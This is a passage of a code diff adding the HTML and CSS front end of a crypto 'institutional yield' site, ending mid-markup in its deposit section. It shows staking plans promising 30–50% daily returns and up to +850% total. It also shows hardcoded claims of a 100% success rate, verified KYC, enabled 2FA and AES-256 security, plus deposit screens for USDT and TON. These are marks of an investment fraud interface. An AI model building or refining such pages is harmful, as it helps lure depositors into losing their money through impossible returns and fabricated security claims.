+    .network-card:hover { border-color: rgba(255, 255, 255, 0.15); transform: translateY(-1px); }
+    .network-card.active { border-color: #10b981 !important; background: linear-gradient(145deg, rgba(16, 185, 129, 0.15) 0%, rgba(6, 182, 212, 0.08) 100%) !important; box-shadow: 0 0 0 1px rgba(16, 185, 129, 0.4), 0 8px 24px rgba(16, 185, 129, 0.2); }
+    .network-card.active .network-check { opacity: 1; transform: scale(1); }
+    .network-check { position: absolute; top: 8px; right: 8px; width: 18px; height: 18px; border-radius: 50%; background: linear-gradient(135deg, #10b981, #06b6d4); display: flex; align-items: center; justify-content: center; color: #000; opacity: 0; transform: scale(0.5); transition: all 0.25s; box-shadow: 0 2px 8px rgba(16, 185, 129, 0.4); z-index: 5; }
+    .network-logo-wrap { width: 38px; height: 38px; border-radius: 12px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; background: #0d1220; padding: 4px; border: 1px solid rgba(255,255,255,0.06); }
+    .network-logo-wrap img { width: 100%; height: 100%; object-fit: contain; }
+    .network-logo-usdt { background: #26A17B15; border-color: #26A17B33; }
+    .network-logo-eth  { background: #627EEA15; border-color: #627EEA33; }
+    .network-logo-bnb  { background: #F3BA2F15; border-color: #F3BA2F33; }
+    .network-logo-ton  { background: #0098EA15; border-color: #0098EA33; }
+
+    .address-display { background: linear-gradient(135deg, #0a0f1a 0%, #0d1420 100%); border: 1px solid rgba(16, 185, 129, 0.25); border-radius: 14px; }
+    .qr-frame { background: linear-gradient(135deg, #10b981 0%, #06b6d4 100%); padding: 3px; border-radius: 16px; box-shadow: 0 8px 24px rgba(16, 185, 129, 0.25); }
+    .qr-frame > div { background: #ffffff; border-radius: 13px; padding: 8px; }
+    .wallet-action-bar { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+    .wallet-action-btn { position: relative; padding: 13px 14px; border-radius: 12px; display: flex; align-items: center; justify-content: center; gap: 7px; font-size: 11px; font-weight: 900; letter-spacing: 0.03em; cursor: pointer; overflow: hidden; border: none; }
+    .wallet-action-btn:hover { transform: translateY(-2px); }
+    .wallet-action-btn.deposit { background: linear-gradient(135deg, rgba(16, 185, 129, 0.2) 0%, rgba(6, 182, 212, 0.1) 100%); border: 1px solid rgba(16, 185, 129, 0.4); color: #10b981; box-shadow: 0 4px 16px -4px rgba(16, 185, 129, 0.4); }
+    .wallet-action-btn.withdraw { background: linear-gradient(135deg, rgba(6, 182, 212, 0.2) 0%, rgba(59, 130, 246, 0.1) 100%); border: 1px solid rgba(6, 182, 212, 0.4); color: #06b6d4; box-shadow: 0 4px 16px -4px rgba(6, 182, 212, 0.4); }
+    .wallet-action-btn-icon { width: 26px; height: 26px; border-radius: 8px; display: flex; align-items: center; justify-content: center; background: rgba(0,0,0,0.3); }
+
+    .modal-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.88); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); display: flex; align-items: center; justify-content: center; padding: 16px; z-index: 9998; }
+    .modal-overlay.hidden { display: none; }
+    @media (max-width: 640px) { .modal-overlay { align-items: flex-start; padding-top: 40px; } }
+
+    .info-row { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255, 255, 255, 0.05); }
+    .info-row:last-child { border-bottom: none; }
+    .info-label { font-size: 11px; color: #9ca3af; display: flex; align-items: center; gap: 8px; }
+    .info-value { font-size: 11px; font-weight: 800; color: #ffffff; font-family: 'JetBrains Mono', monospace; }
+
+    .metric-card { background: linear-gradient(145deg, rgba(17, 22, 34, 0.9) 0%, rgba(11, 16, 27, 0.9) 100%); border: 1px solid rgba(255, 255, 255, 0.06); border-radius: 14px; padding: 12px; transition: all 0.2s; }
+    .metric-card:hover { border-color: rgba(16, 185, 129, 0.3); transform: translateY(-2px); }
+    .metric-label { font-size: 9px; color: #6b7280; text-transform: uppercase; letter-spacing: 0.05em; font-weight: 800; display: block; margin-bottom: 4px; }
+    .metric-value { font-size: 15px; font-weight: 900; color: #ffffff; font-family: 'JetBrains Mono', monospace; }
+
+    .input-safe { scroll-margin-top: 100px; scroll-margin-bottom: 300px; }
+
+    .bybit-tabs { display: flex; background: rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.06); border-radius: 14px; padding: 4px; gap: 4px; }
+    .bybit-tab { flex: 1; padding: 10px 12px; border-radius: 10px; font-size: 12px; font-weight: 800; letter-spacing: 0.02em; color: #9ca3af; text-align: center; cursor: pointer; transition: background 0.2s, color 0.2s; display: flex; align-items: center; justify-content: center; gap: 6px; }
+    .bybit-tab.active { background: #1a2030; color: #fff; box-shadow: inset 0 0 0 1px rgba(255,255,255,0.08); }
+    .bybit-tab.active i { color: #10b981; }
+    .bybit-tab.active.deposit-tab i { color: #10b981; }
+    .bybit-tab.active.withdraw-tab i { color: #06b6d4; }
+
+    .bybit-amount-box { background: rgba(0,0,0,0.35); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 18px 16px; transition: border-color 0.2s; }
+    .bybit-amount-box:focus-within { border-color: rgba(16,185,129,0.5); box-shadow: 0 0 0 3px rgba(16,185,129,0.1); }
+    .bybit-amount-input { background: transparent; border: none; font-size: 28px; font-weight: 900; font-family: 'JetBrains Mono', monospace; color: #fff; width: 100%; letter-spacing: -0.02em; }
+    .bybit-amount-input::placeholder { color: #374151; }
+
+    .quick-chip { flex: 1; padding: 8px 4px; border-radius: 10px; background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08); font-size: 11px; font-weight: 800; color: #9ca3af; transition: background 0.15s, color 0.15s, border-color 0.15s; }
+    .quick-chip:hover { background: rgba(16,185,129,0.1); color: #10b981; border-color: rgba(16,185,129,0.3); }
+
+    .bybit-info-row { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; font-size: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); }
+    .bybit-info-row:last-child { border-bottom: none; }
+    .bybit-info-label { color: #6b7280; font-weight: 600; }
+    .bybit-info-value { color: #fff; font-weight: 800; font-family: 'JetBrains Mono', monospace; }
+
+    .verified-chip { display: inline-flex; align-items: center; gap: 4px; font-size: 9px; font-weight: 700; padding: 3px 8px; border-radius: 999px; background: rgba(16, 185, 129, 0.12); color: #10b981; border: 1px solid rgba(16, 185, 129, 0.3); letter-spacing: 0.03em; text-transform: uppercase; }
+
+    @keyframes iconEnter { 0% { transform: scale(0.3) rotate(-30deg); opacity: 0; } 60% { transform: scale(1.08) rotate(4deg); } 100% { transform: scale(1) rotate(0deg); opacity: 1; } }
+  </style>
+</head>
+<body class="font-sans antialiased pb-32">
+
+  <header class="p-4 border-b border-brand-border bg-brand-bg/95 backdrop-blur-md sticky top-0 z-30">
+    <div class="flex items-center justify-between">
+      <div class="flex items-center gap-2.5">
+        <div class="w-10 h-10 rounded-xl gradient-bg flex items-center justify-center text-black shadow-lg shadow-emerald-500/20 font-black">
+          <i data-lucide="gem" class="w-6 h-6"></i>
+        </div>
+        <div>
+          <h2 class="font-extrabold text-base leading-tight text-white tracking-wide">CRYPT<span class="gradient-text">NEXA</span></h2>
+          <span class="text-[10px] text-gray-400 font-medium tracking-wider uppercase">Institutional Crypto Yield</span>
+        </div>
+      </div>
+
+      <div class="flex items-center gap-2 cursor-pointer" onclick="switchTab('profile')">
+        <div id="user-avatar" class="w-8 h-8 rounded-full bg-brand-card border border-emerald-500/30 flex items-center justify-center font-bold text-xs text-emerald-400">U</div>
+        <span id="user-name" class="text-xs font-semibold text-gray-300 hidden sm:inline">Investor</span>
+      </div>
+    </div>
+  </header>
+
+  <!-- DASHBOARD -->
+  <main id="tab-dashboard" class="tab-content active p-4 space-y-5">
+    
+    <div class="relative overflow-hidden rounded-3xl p-5 bg-gradient-to-br from-[#111622] via-[#0d131f] to-[#080b11] border border-emerald-500/20 shadow-2xl">
+      <div class="absolute -right-12 -top-12 w-40 h-40 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+      <div class="absolute -left-12 -bottom-12 w-40 h-40 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+      <div class="relative z-10 space-y-3">
+        <div class="flex items-center justify-between">
+          <div class="flex items-center gap-2">
+            <div class="live-dot"></div>
+            <span class="text-[11px] font-bold text-gray-400 tracking-wider uppercase">TOTAL NET WORTH</span>
+          </div>
+          <div class="flex items-center gap-1.5 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-1 rounded-full text-emerald-400 text-[11px] font-extrabold">
+            <i data-lucide="trending-up" class="w-3.5 h-3.5"></i> <span id="total-roi-badge">+0.0%</span>
+          </div>
+        </div>
+
+        <div>
+          <h1 class="text-3xl sm:text-4xl font-black text-white tracking-tight" id="main-balance">$0.00</h1>
+          <p class="text-[10px] text-gray-500 mt-1 font-mono">Updated <span id="balance-updated-time">just now</span></p>
+        </div>
+
+        <div class="w-full h-px bg-gradient-to-r from-emerald-500/30 via-brand-border to-transparent"></div>
+
+        <div class="flex items-center justify-between text-xs">
+          <div class="flex items-center gap-2 text-gray-400">
+            <div class="w-6 h-6 rounded-lg bg-cyan-500/10 text-cyan-400 flex items-center justify-center">
+              <i data-lucide="lock" class="w-3.5 h-3.5"></i>
+            </div>
+            <span>Active Locked Funds</span>
+          </div>
+          <span id="locked-balance" class="text-cyan-400 font-extrabold text-sm font-mono">$0.00</span>
+        </div>
+
+        <div class="wallet-action-bar pt-2">
+          <button onclick="openWalletAction('deposit')" class="wallet-action-btn deposit">
+            <div class="wallet-action-btn-icon"><i data-lucide="arrow-down-left" class="w-3.5 h-3.5"></i></div>
+            <span>Deposit</span>
+          </button>
+          <button onclick="openWalletAction('withdraw')" class="wallet-action-btn withdraw">
+            <div class="wallet-action-btn-icon"><i data-lucide="arrow-up-right" class="w-3.5 h-3.5"></i></div>
+            <span>Withdraw</span>
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div>
+      <div class="flex items-center justify-between mb-3">
+        <h3 class="text-sm font-bold text-gray-400 uppercase tracking-wider flex items-center gap-2">
+          <i data-lucide="activity" class="w-4 h-4 text-emerald-400"></i> Active Investments
+        </h3>
+        <span id="active-inv-count" class="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-0.5 rounded font-mono font-bold">0 Active</span>
+      </div>
+      <div id="active-investments-container" class="space-y-3">
+        <div class="glass-card rounded-xl p-4 text-center text-xs text-gray-400 border border-brand-border">
+          No active investments. Deploy capital below to start earning.
+        </div>
+      </div>
+    </div>
+
+    <div id="investment-plans-section">
+      <div class="flex items-center justify-between mb-3">
+        <h3 class="text-sm font-bold text-gray-400 uppercase tracking-wider flex items-center gap-2">
+          <i data-lucide="zap" class="w-4 h-4 text-cyan-400"></i> Investment Plans
+        </h3>
+        <span class="text-[9px] text-gray-500 font-mono">USDT STAKING</span>
+      </div>
+
+      <div class="space-y-3">
+        <!-- STARTER -->
+        <div class="invest-plan-pro invest-plan-starter">
+          <div class="flex items-start justify-between gap-3 mb-2 relative z-10">
+            <div class="flex items-center gap-3 min-w-0">
+              <div class="invest-plan-icon"><i data-lucide="rocket" class="w-6 h-6"></i></div>
+              <div class="min-w-0">
+                <div class="flex items-center gap-2 mb-1.5 flex-wrap">
+                  <span class="invest-plan-badge"><i data-lucide="sparkles" class="w-2.5 h-2.5"></i> Starter</span>
+                </div>
+                <h4 class="invest-plan-title">Starter Sprint</h4>
+                <p class="text-[10px] text-gray-500 font-mono mt-0.5">5-Day Fixed Staking</p>
+              </div>
+            </div>
+            <div class="text-right shrink-0">
+              <div class="invest-plan-roi">30%</div>
+              <div class="invest-plan-roi-label">Daily ROI</div>
+            </div>
+          </div>
+
+          <div class="invest-plan-meta">
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Duration</span><span class="invest-plan-meta-value">5 Days</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Total Return</span><span class="invest-plan-meta-value" style="color:#10b981">+250%</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Min Deposit</span><span class="invest-plan-meta-value">$5.00</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Max Deposit</span><span class="invest-plan-meta-value">$99.00</span></div>
+          </div>
+
+          <div class="invest-plan-features">
+            <span class="invest-plan-feature-tag">Principal Included</span>
+            <span class="invest-plan-feature-tag">Daily Payout</span>
+            <span class="invest-plan-feature-tag">Instant Start</span>
+          </div>
+
+          <button onclick="openInvestModal('Starter Sprint', 30.0, 5, 5, 99)" class="invest-plan-cta">
+            <i data-lucide="zap" class="w-4 h-4"></i> Stake Now
+          </button>
+        </div>
+
+        <!-- SILVER -->
+        <div class="invest-plan-pro invest-plan-silver">
+          <div class="flex items-start justify-between gap-3 mb-2 relative z-10">
+            <div class="flex items-center gap-3 min-w-0">
+              <div class="invest-plan-icon"><i data-lucide="medal" class="w-6 h-6"></i></div>
+              <div class="min-w-0">
+                <div class="flex items-center gap-2 mb-1.5 flex-wrap">
+                  <span class="invest-plan-badge"><i data-lucide="shield" class="w-2.5 h-2.5"></i> Silver</span>
+                </div>
+                <h4 class="invest-plan-title">Silver Boost</h4>
+                <p class="text-[10px] text-gray-500 font-mono mt-0.5">7-Day Fixed Staking</p>
+              </div>
+            </div>
+            <div class="text-right shrink-0">
+              <div class="invest-plan-roi">35%</div>
+              <div class="invest-plan-roi-label">Daily ROI</div>
+            </div>
+          </div>
+
+          <div class="invest-plan-meta">
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Duration</span><span class="invest-plan-meta-value">7 Days</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Total Return</span><span class="invest-plan-meta-value" style="color:#06b6d4">+345%</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Min Deposit</span><span class="invest-plan-meta-value">$100.00</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Max Deposit</span><span class="invest-plan-meta-value">$499.00</span></div>
+          </div>
+
+          <div class="invest-plan-features">
+            <span class="invest-plan-feature-tag">Principal Included</span>
+            <span class="invest-plan-feature-tag">Daily Payout</span>
+            <span class="invest-plan-feature-tag">Priority Support</span>
+          </div>
+
+          <button onclick="openInvestModal('Silver Boost', 35.0, 7, 100, 499)" class="invest-plan-cta">
+            <i data-lucide="zap" class="w-4 h-4"></i> Stake Now
+          </button>
+        </div>
+
+        <!-- GOLD -->
+        <div class="invest-plan-pro invest-plan-gold">
+          <div class="invest-plan-popular">POPULAR</div>
+          <div class="flex items-start justify-between gap-3 mb-2 relative z-10">
+            <div class="flex items-center gap-3 min-w-0">
+              <div class="invest-plan-icon"><i data-lucide="crown" class="w-6 h-6"></i></div>
+              <div class="min-w-0">
+                <div class="flex items-center gap-2 mb-1.5 flex-wrap">
+                  <span class="invest-plan-badge"><i data-lucide="flame" class="w-2.5 h-2.5"></i> Gold</span>
+                </div>
+                <h4 class="invest-plan-title">Gold Growth</h4>
+                <p class="text-[10px] text-gray-500 font-mono mt-0.5">10-Day Fixed Staking</p>
+              </div>
+            </div>
+            <div class="text-right shrink-0">
+              <div class="invest-plan-roi">40%</div>
+              <div class="invest-plan-roi-label">Daily ROI</div>
+            </div>
+          </div>
+
+          <div class="invest-plan-meta">
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Duration</span><span class="invest-plan-meta-value">10 Days</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Total Return</span><span class="invest-plan-meta-value" style="color:#f59e0b">+500%</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Min Deposit</span><span class="invest-plan-meta-value">$500.00</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Max Deposit</span><span class="invest-plan-meta-value">$1,999.00</span></div>
+          </div>
+
+          <div class="invest-plan-features">
+            <span class="invest-plan-feature-tag">Principal Included</span>
+            <span class="invest-plan-feature-tag">Daily Payout</span>
+            <span class="invest-plan-feature-tag">VIP Manager</span>
+          </div>
+
+          <button onclick="openInvestModal('Gold Growth', 40.0, 10, 500, 1999)" class="invest-plan-cta">
+            <i data-lucide="zap" class="w-4 h-4"></i> Stake Now
+          </button>
+        </div>
+
+        <!-- VIP -->
+        <div class="invest-plan-pro invest-plan-vip">
+          <div class="flex items-start justify-between gap-3 mb-2 relative z-10">
+            <div class="flex items-center gap-3 min-w-0">
+              <div class="invest-plan-icon"><i data-lucide="gem" class="w-6 h-6"></i></div>
+              <div class="min-w-0">
+                <div class="flex items-center gap-2 mb-1.5 flex-wrap">
+                  <span class="invest-plan-badge"><i data-lucide="diamond" class="w-2.5 h-2.5"></i> VIP Elite</span>
+                </div>
+                <h4 class="invest-plan-title">VIP Max</h4>
+                <p class="text-[10px] text-gray-500 font-mono mt-0.5">15-Day Fixed Staking</p>
+              </div>
+            </div>
+            <div class="text-right shrink-0">
+              <div class="invest-plan-roi">50%</div>
+              <div class="invest-plan-roi-label">Daily ROI</div>
+            </div>
+          </div>
+
+          <div class="invest-plan-meta">
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Duration</span><span class="invest-plan-meta-value">15 Days</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Total Return</span><span class="invest-plan-meta-value" style="color:#a855f7">+850%</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Min Deposit</span><span class="invest-plan-meta-value">$2,000.00</span></div>
+            <div class="invest-plan-meta-cell"><span class="invest-plan-meta-label">Max Deposit</span><span class="invest-plan-meta-value">$10,000.00</span></div>
+          </div>
+
+          <div class="invest-plan-features">
+            <span class="invest-plan-feature-tag">Principal Included</span>
+            <span class="invest-plan-feature-tag">Daily Payout</span>
+            <span class="invest-plan-feature-tag">Dedicated Manager</span>
+            <span class="invest-plan-feature-tag">Whale Access</span>
+          </div>
+
+          <button onclick="openInvestModal('VIP Max', 50.0, 15, 2000, 10000)" class="invest-plan-cta">
+            <i data-lucide="zap" class="w-4 h-4"></i> Stake Now
+          </button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- WALLET -->
+  <main id="tab-wallet" class="tab-content p-4 space-y-4">
+    
+    <div id="wallet-overview" class="space-y-4">
+      <div class="glass-card rounded-3xl p-5 border border-emerald-500/30 relative overflow-hidden shadow-2xl bg-gradient-to-br from-[#111622] via-[#0b101b] to-[#080b11]">
+        <div class="absolute -right-10 -top-10 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
+        <div class="absolute -left-10 -bottom-10 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl pointer-events-none"></div>
+
+        <div class="relative z-10 space-y-3">
+          <div class="flex items-center justify-between">
+            <div class="flex items-center gap-2">
+              <div class="w-9 h-9 rounded-xl bg-gradient-to-br from-emerald-500 to-cyan-500 flex items-center justify-center shadow-lg shadow-emerald-500/20">
+                <i data-lucide="wallet" class="w-4 h-4 text-black"></i>
+              </div>
+              <div>
+                <span class="text-[10px] text-gray-400 uppercase tracking-wider font-extrabold block">Wallet Balance</span>
+                <span class="text-[9px] text-emerald-400 font-mono font-bold">LIVE UPDATES</span>
+              </div>
+            </div>
+            <div class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></div>
+          </div>
+          
+          <div>
+            <h2 class="text-3xl font-black text-white tracking-tight" id="wallet-balance-display">$0.00</h2>
+            <p class="text-[10px] text-gray-500 mt-1 font-mono">Available for withdrawal & investment</p>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2 pt-2 border-t border-brand-border">
+            <div class="bg-brand-bg/60 p-2.5 rounded-xl border border-brand-border">
+              <span class="text-[9px] text-gray-400 uppercase font-bold block">Available</span>
+              <span class="text-sm font-black text-emerald-400 font-mono" id="metric-liquid">$0.00</span>
+            </div>
+            <div class="bg-brand-bg/60 p-2.5 rounded-xl border border-brand-border">
+              <span class="text-[9px] text-gray-400 uppercase font-bold block">Locked</span>
+              <span class="text-sm font-black text-cyan-400 font-mono" id="metric-locked">$0.00</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div>
+        <h3 class="text-xs font-bold text-gray-400 uppercase tracking-wider mb-2 flex items-center gap-2">
+          <i data-lucide="bar-chart-3" class="w-3.5 h-3.5 text-emerald-400"></i> Account Metrics
+        </h3>
+        <div class="grid grid-cols-2 gap-2">
+          <div class="metric-card">
+            <div class="flex items-center justify-between mb-1">
+              <span class="metric-label">Lifetime Deposited</span>
+              <i data-lucide="arrow-down-left" class="w-3 h-3 text-emerald-400"></i>
+            </div>
+            <span class="metric-value text-emerald-400" id="stat-deposited">$0.00</span>
+          </div>
+          <div class="metric-card">
+            <div class="flex items-center justify-between mb-1">
+              <span class="metric-label">Lifetime Withdrawn</span>
+              <i data-lucide="arrow-up-right" class="w-3 h-3 text-cyan-400"></i>
+            </div>
+            <span class="metric-value text-cyan-400" id="stat-withdrawn">$0.00</span>
+          </div>
+          <div class="metric-card">
+            <div class="flex items-center justify-between mb-1">
+              <span class="metric-label">Total ROI</span>
+              <i data-lucide="trending-up" class="w-3 h-3 text-purple-400"></i>
+            </div>
+            <span class="metric-value text-purple-400" id="wallet-total-roi">+0.0%</span>
+          </div>
+          <div class="metric-card">
+            <div class="flex items-center justify-between mb-1">
+              <span class="metric-label">Active Plans</span>
+              <i data-lucide="activity" class="w-3 h-3 text-amber-400"></i>
+            </div>
+            <span class="metric-value text-amber-400" id="wallet-active-plans">0</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-2">
+        <div class="flex items-center justify-between pb-2 border-b border-brand-border">
+          <h3 class="text-xs font-bold text-white flex items-center gap-1.5">
+            <i data-lucide="shield-check" class="w-4 h-4 text-emerald-400"></i> Security & Compliance
+          </h3>
+          <span class="text-[9px] bg-emerald-500/10 text-emerald-400 font-bold px-2 py-0.5 rounded-full font-mono">VERIFIED</span>
+        </div>
+        
+        <div class="info-row"><span class="info-label"><i data-lucide="lock" class="w-3.5 h-3.5 text-emerald-400"></i> Encryption</span><span class="info-value text-cyan-400">AES-256 Bit</span></div>
+        <div class="info-row"><span class="info-label"><i data-lucide="key" class="w-3.5 h-3.5 text-amber-400"></i> 2FA Authentication</span><span class="info-value text-emerald-400">Enabled</span></div>
+        <div class="info-row"><span class="info-label"><i data-lucide="user-check" class="w-3.5 h-3.5 text-purple-400"></i> KYC Status</span><span class="info-value text-emerald-400">Verified</span></div>
+        <div class="info-row"><span class="info-label"><i data-lucide="vault" class="w-3.5 h-3.5 text-cyan-400"></i> Vault Type</span><span class="info-value text-white">Institutional</span></div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3">
+        <div class="flex items-center justify-between pb-2 border-b border-brand-border">
+          <h3 class="text-xs font-bold text-white flex items-center gap-1.5">
+            <i data-lucide="network" class="w-4 h-4 text-cyan-400"></i> Supported Networks
+          </h3>
+          <span class="text-[9px] bg-cyan-500/10 text-cyan-400 font-bold px-2 py-0.5 rounded-full font-mono">4 NETWORKS</span>
+        </div>
+
+        <div class="grid grid-cols-4 gap-2">
+          <div class="flex flex-col items-center gap-1.5 p-2 rounded-xl bg-brand-bg border border-brand-border">
+            <div class="network-logo-wrap network-logo-usdt" style="width:32px;height:32px;">
+              <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=040" alt="USDT" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#26A17B;font-weight:900;font-size:14px\'>₮</span>'">
+            </div>
+            <span class="text-[8px] font-black text-white">USDT</span>
+            <span class="text-[7px] text-emerald-400 font-mono">TRC20</span>
+          </div>
+          <div class="flex flex-col items-center gap-1.5 p-2 rounded-xl bg-brand-bg border border-brand-border">
+            <div class="network-logo-wrap network-logo-bnb" style="width:32px;height:32px;">
+              <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=040" alt="BEP20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#F3BA2F;font-weight:900;font-size:14px\'>⚡</span>'">
+            </div>
+            <span class="text-[8px] font-black text-white">USDT</span>
+            <span class="text-[7px] text-amber-400 font-mono">BEP20</span>
+          </div>
+          <div class="flex flex-col items-center gap-1.5 p-2 rounded-xl bg-brand-bg border border-brand-border">
+            <div class="network-logo-wrap network-logo-eth" style="width:32px;height:32px;">
+              <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=040" alt="ERC20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#627EEA;font-weight:900;font-size:14px\'>Ξ</span>'">
+            </div>
+            <span class="text-[8px] font-black text-white">USDT</span>
+            <span class="text-[7px] text-blue-400 font-mono">ERC20</span>
+          </div>
+          <div class="flex flex-col items-center gap-1.5 p-2 rounded-xl bg-brand-bg border border-brand-border">
+            <div class="network-logo-wrap network-logo-ton" style="width:32px;height:32px;">
+              <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png?v=040" alt="TON" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#0098EA;font-weight:900;font-size:14px\'>💎</span>'">
+            </div>
+            <span class="text-[8px] font-black text-white">TON</span>
+            <span class="text-[7px] text-cyan-400 font-mono">TON</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3">
+        <h3 class="text-xs font-bold text-white flex items-center gap-1.5 pb-2 border-b border-brand-border">
+          <i data-lucide="line-chart" class="w-4 h-4 text-purple-400"></i> Performance Analytics
+        </h3>
+        
+        <div class="grid grid-cols-3 gap-2">
+          <div class="text-center p-2.5 rounded-xl bg-brand-bg border border-brand-border">
+            <span class="text-[8px] text-gray-400 uppercase font-bold block mb-1">Avg Yield</span>
+            <span class="text-xs font-black text-emerald-400 font-mono" id="avg-daily-yield">+0.0%</span>
+          </div>
+          <div class="text-center p-2.5 rounded-xl bg-brand-bg border border-brand-border">
+            <span class="text-[8px] text-gray-400 uppercase font-bold block mb-1">Total Profit</span>
+            <span class="text-xs font-black text-cyan-400 font-mono" id="total-profit">$0.00</span>
+          </div>
+          <div class="text-center p-2.5 rounded-xl bg-brand-bg border border-brand-border">
+            <span class="text-[8px] text-gray-400 uppercase font-bold block mb-1">Success Rate</span>
+            <span class="text-xs font-black text-purple-400 font-mono">100%</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-3 flex items-center justify-between border border-emerald-500/20 bg-emerald-500/5">
+        <div class="flex items-center gap-2">
+          <div class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></div>
+          <span class="text-[10px] font-bold text-emerald-400 uppercase tracking-wider">All Systems Operational</span>
+        </div>
+        <span class="text-[9px] text-gray-400 font-mono">v3.0.0</span>
+      </div>
+    </div>
+
+    <!-- DEPOSIT -->
+    <div id="section-deposit" class="space-y-4 hidden">
+      <div class="flex items-center justify-between">
+        <button onclick="backToWalletOverview()" class="text-xs text-emerald-400 flex items-center gap-1.5 font-bold bg-emerald-500/10 hover:bg-emerald-500/20 px-3 py-2 rounded-lg border border-emerald-500/20 transition-all">
+          <i data-lucide="arrow-left" class="w-3.5 h-3.5"></i> Back
+        </button>
+        <div class="flex items-center gap-1.5 verified-chip">
+          <i data-lucide="shield-check" class="w-3 h-3"></i> SECURE
+        </div>
+      </div>
+
+      <div class="bybit-tabs">
+        <div class="bybit-tab active deposit-tab" onclick="openWalletAction('deposit')">
+          <i data-lucide="arrow-down-to-line" class="w-4 h-4"></i> Deposit
+        </div>
+        <div class="bybit-tab" onclick="openWalletAction('withdraw')">
+          <i data-lucide="arrow-up-from-line" class="w-4 h-4"></i> Withdraw
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3 border border-white/5">
+        <div class="flex items-center justify-between">
+          <span class="text-[10px] text-gray-400 uppercase font-bold">Select Network</span>
+          <span class="text-[10px] text-emerald-400 font-mono font-bold">USDT</span>
+        </div>
+
+        <div class="grid grid-cols-2 gap-2">
+          <div onclick="selectCryptoMethod('usdt_trc20')" id="card-usdt_trc20" class="network-card active">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-usdt" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=040" alt="USDT" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#26A17B;font-weight:900;font-size:16px\'>₮</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-emerald-400 font-bold">TRC20</p>
+              </div>
+            </div>
+          </div>
+
+          <div onclick="selectCryptoMethod('usdt_bep20')" id="card-usdt_bep20" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-bnb" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=040" alt="BEP20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#F3BA2F;font-weight:900;font-size:16px\'>⚡</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-amber-400 font-bold">BEP20</p>
+              </div>
+            </div>
+          </div>
+
+          <div onclick="selectCryptoMethod('usdt_erc20')" id="card-usdt_erc20" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-eth" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=040" alt="ERC20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#627EEA;font-weight:900;font-size:16px\'>Ξ</span>'">
